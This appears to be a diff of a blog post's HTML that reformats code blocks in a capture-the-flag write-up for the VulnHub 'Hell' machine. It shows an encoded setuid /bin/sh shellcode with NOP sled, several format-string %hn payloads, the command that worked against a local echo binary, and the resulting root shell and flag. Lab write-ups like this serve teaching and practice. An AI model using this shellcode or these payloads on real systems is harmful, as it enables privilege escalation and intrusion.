@@ -98,7 +98,10 @@
 
 <p>Meh, let&rsquo;s put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we&rsquo;re progressing.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]export SHELLCODE=$(python -c &lsquo;print &ldquo;\x90&rdquo; * 1000 + &ldquo;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&rdquo;&rsquo;)[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot; * 1000 + &quot;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&quot;&#39;</span><span class="k">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>So, I started to play around with gdb and format strings.
 There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you&rsquo;re unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that&hellip; it didn&rsquo;t work because my shellcode kept moving in memory.</p>
@@ -122,42 +125,60 @@ $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x0
 $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%113\$hn%15217c%112\$hn
 $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%118\$hn%15217u%117\$hn
 $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn
-$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217c%119\$hn
-[/plain]</p>
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217c%119\$hn</p>
 
-<p>I spent a lot of time staring at segfault after segfault until I stumbled upon this random combination of characters (I really really want to explain how I worked it out, but I&rsquo;m not 100% sure myself. I guess that&rsquo;s a follow up post sometime. Also, it is possible this wont work for you).</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>I spent a lot of <span class="nb">time </span>staring at segfault after segfault <span class="k">until</span> I stumbled upon this random combination of characters <span class="o">(</span>I really really want to explain how I worked it out, but I<span class="s1">&#39;m not 100% sure myself. I guess that&#39;</span>s a follow up post sometime. Also, it is possible this wont work <span class="k">for</span> you<span class="o">)</span>.
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>plain<span class="o">]</span>
+</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAAB%49139u%118<span class="se">\$</span>hn%15217c%117<span class="se">\$</span>hn
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain]
-$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>
 
 <p>Which when executed like this</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ /home/oj/echo $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/home/oj/echo <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAAB%49139u%118<span class="se">\$</span>hn%15217c%117<span class="se">\$</span>hn
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>dropped me to a shell.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># id </span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1005<span class="o">(</span>oj<span class="o">)</span>
+</span><span class='line'><span class="c"># whoami </span>
+</span><span class='line'>root
+</span><span class='line'><span class="c"># cat /root/flag.txt </span>
+</span><span class='line'>Congratulations of beating Hell.
+</span><span class='line'>
+</span><span class='line'>I hope you enjoyed it and there weren<span class="err">&#39;</span>t to many trolls in here <span class="k">for</span> you.
+</span><span class='line'>
+</span><span class='line'>Hit me up on irc.freenode.net in <span class="c">#vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242 </span>
+</span><span class='line'>
+</span><span class='line'>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c"># </span>
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>id</h1>
-
-<p>uid=0(root) gid=1005(oj) groups=0(root),1005(oj)</p>
-
-<h1>whoami</h1>
-
-<p>root</p>
-
-<h1>cat /root/flag.txt</h1>
-
-<p>Congratulations of beating Hell.</p>
-
-<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>
-
-<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>
-
-<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>
-
-<h1>[/plain]</h1>
 
 <p><img src="http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif" alt="" /></p>
 
